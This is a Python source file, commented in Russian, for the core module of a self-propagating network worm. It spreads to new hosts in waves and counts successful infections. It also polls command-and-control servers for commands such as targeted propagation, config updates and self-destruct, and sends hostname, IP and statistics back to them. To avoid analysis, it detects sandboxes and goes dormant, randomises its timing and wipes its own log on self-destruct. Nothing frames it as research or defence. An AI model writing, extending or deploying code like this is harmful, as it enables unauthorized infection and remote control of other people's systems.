import time
import os
import random
import threading
import logging
import socket
from datetime import datetime

# Импортируем свои модули
from worm.propagation import propagate, propagate_targeted
from stealth.stealth import enable_stealth, is_vm
from comms.comms import establish_c2, send_c2_data, receive_c2_commands

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename=os.path.join(os.path.dirname(__file__), 'worm.log')
)
logger = logging.getLogger('WormCore')

class WormCore:
    def __init__(self, config=None):
        self.running = False
        self.config = config or {
            'sleep_interval': 60,
            'jitter': 15,            # Случайное отклонение интервала для усложнения обнаружения
            'c2_servers': ['8.8.8.8', '1.1.1.1'],  # Резервные C2 серверы
            'stealth_mode': True,
            'propagation_enabled': True,
            'max_targets_per_wave': 5  # Ограничение количества целей за одну волну
        }
        self.target_cache = set()    # Кэш уже просканированных целей
        self.execution_stats = {
            'start_time': datetime.now(),
            'propagation_attempts': 0,
            'successful_infections': 0,
            'total_commands_executed': 0
        }
        self.command_queue = []      # Очередь команд от C2
        self.c2_thread = None        # Поток для связи с C2
        self.sandbox_detected = False
        logger.info("WormCore initialized")
    
    def start(self):
        """Запускает все основные процессы червя"""
        self.running = True
        
        # Проверяем, не находимся ли в песочнице
        self.sandbox_detected = is_vm()
        if self.sandbox_detected:
            logger.warning("Sandbox environment detected! Changing behavior...")
            # Изменяем поведение, чтобы избежать обнаружения
            self._enter_sandbox_mode()
            return
            
        # Устанавливаем режим скрытности
        if self.config['stealth_mode']:
            enable_stealth()
            
        # Запускаем связь с C2 в отдельном потоке
        self.c2_thread = threading.Thread(target=self._c2_communication_loop)
        self.c2_thread.daemon = True
        self.c2_thread.start()
        
        # Основной цикл
        self._main_loop()
        
    def stop(self):
        """Останавливает все процессы червя"""
        logger.info("Stopping worm processes...")
        self.running = False
        # Ждем завершения потоков
        if self.c2_thread:
            self.c2_thread.join(timeout=5)
        logger.info("Worm stopped")
    
    def _main_loop(self):
        """Основной цикл работы червя"""
        while self.running:
            try:
                # 1. Проверяем и выполняем команды из очереди
                self._process_command_queue()
                
                # 2. Выполняем распространение, если оно включено
                if self.config['propagation_enabled']:
                    self._execute_propagation()
                
                # 3. Отправляем статистику на C2, если есть соединение
                self._report_statistics()
                
                # 4. Спим с добавлением случайного jitter
                jitter = random.randint(-self.config['jitter'], self.config['jitter'])
                sleep_time = max(10, self.config['sleep_interval'] + jitter)
                logger.debug(f"Sleeping for {sleep_time} seconds...")
                time.sleep(sleep_time)
                
            except Exception as e:
                logger.error(f"Error in main loop: {e}", exc_info=True)
                # В случае ошибки ждем немного и продолжаем
                time.sleep(10)
    
    def _c2_communication_loop(self):
        """Поток для связи с C2-сервером"""
        # Устанавливаем соединение с C2
        c2_connection = establish_c2(self.config['c2_servers'])
        
        while self.running:
            try:
                # Получаем команды от C2
                new_commands = receive_c2_commands(c2_connection)
                if new_commands:
                    logger.info(f"Received {len(new_commands)} new commands from C2")
                    # Добавляем команды в очередь
                    self.command_queue.extend(new_commands)
                
                # Спим между проверками
                time.sleep(30)
            except Exception as e:
                logger.error(f"Error in C2 communication: {e}", exc_info=True)
                time.sleep(60)  # Более длинная задержка при ошибке
                # Пробуем переустановить соединение
                c2_connection = establish_c2(self.config['c2_servers'])
    
    def _process_command_queue(self):
        """Обрабатывает очередь команд от C2"""
        if not self.command_queue:
            return
            
        logger.info(f"Processing {len(self.command_queue)} commands in queue")
        remaining_commands = []
        
        for cmd in self.command_queue:
            try:
                logger.info(f"Executing command: {cmd['type']}")
                
                if cmd['type'] == 'config_update':
                    # Обновляем конфигурацию
                    self.config.update(cmd['data'])
                    logger.info(f"Configuration updated: {cmd['data']}")
                
                elif cmd['type'] == 'propagate_targeted':
                    # Целевое распространение на конкретные хосты
                    propagate_targeted(cmd['data']['targets'], 
                                      cmd['data'].get('techniques', None))
                    
                elif cmd['type'] == 'execute_payload':
                    # Выполнение произвольного payload
                    # TODO: Реализовать выполнение payload
                    pass
                
                elif cmd['type'] == 'sleep':
                    # Команда на временное приостановление активности
                    sleep_time = cmd['data'].get('duration', 3600)
                    logger.info(f"Going to sleep for {sleep_time} seconds")
                    time.sleep(sleep_time)
                
                elif cmd['type'] == 'self_destruct':
                    # Уничтожение червя
                    logger.warning("Self-destruct command received!")
                    self._self_destruct()
                    return
                
                # Увеличиваем счетчик выполненных команд
                self.execution_stats['total_commands_executed'] += 1
                
            except Exception as e:
                logger.error(f"Error executing command {cmd}: {e}", exc_info=True)
                # Если команда не выполнилась, сохраняем для повторной попытки
                remaining_commands.append(cmd)
        
        # Обновляем очередь, оставляя только невыполненные команды
        self.command_queue = remaining_commands
    
    def _execute_propagation(self):
        """Выполняет распространение червя"""
        # Увеличиваем счетчик попыток распространения
        self.execution_stats['propagation_attempts'] += 1
        
        # Выполняем распространение и получаем результаты
        results = propagate(max_targets=self.config['max_targets_per_wave'])
        
        if results and 'infected' in results:
            # Обновляем статистику
            self.execution_stats['successful_infections'] += len(results['infected'])
            # Обновляем кэш просканированных целей
            self.target_cache.update(results['scanned'])
            
            # Отправляем отчет на C2
            send_c2_data({
                'type': 'propagation_report',
                'data': results
            })
    
    def _report_statistics(self):
        """Отправляет статистику на C2-сервер"""
        # Подготавливаем актуальную статистику
        stats = {
            'uptime': (datetime.now() - self.execution_stats['start_time']).total_seconds(),
            'propagation_attempts': self.execution_stats['propagation_attempts'],
            'successful_infections': self.execution_stats['successful_infections'],
            'total_commands_executed': self.execution_stats['total_commands_executed'],
            'system_info': {
                'hostname': socket.gethostname(),
                'ip': socket.gethostbyname(socket.gethostname()),
                'os': os.name,
                'pid': os.getpid()
            }
        }
        
        # Отправляем статистику
        send_c2_data({
            'type': 'statistics',
            'data': stats
        })
    
    def _enter_sandbox_mode(self):
        """Изменяет поведение в случае обнаружения песочницы"""
        logger.info("Entering sandbox mode with harmless behavior")
        # Притворяемся обычной программой, не выполняем опасные действия
        while True:
            # Имитируем какую-то безобидную активность
            time.sleep(600)  # Спим 10 минут
    
    def _self_destruct(self):
        """Уничтожает червя и удаляет все следы"""
        logger.warning("Executing self-destruct procedure")
        
        # Останавливаем все процессы
        self.running = False
        
        # Чистим логи
        try:
            open(os.path.join(os.path.dirname(__file__), 'worm.log'), 'w').close()
        except:
            pass
            
        # TODO: Удаление файлов червя
        
        # Завершаем процесс
        os._exit(0)

def main():
    """Основная функция запуска червя"""
    worm = WormCore()
    worm.start()

if __name__ == "__main__":
    main()
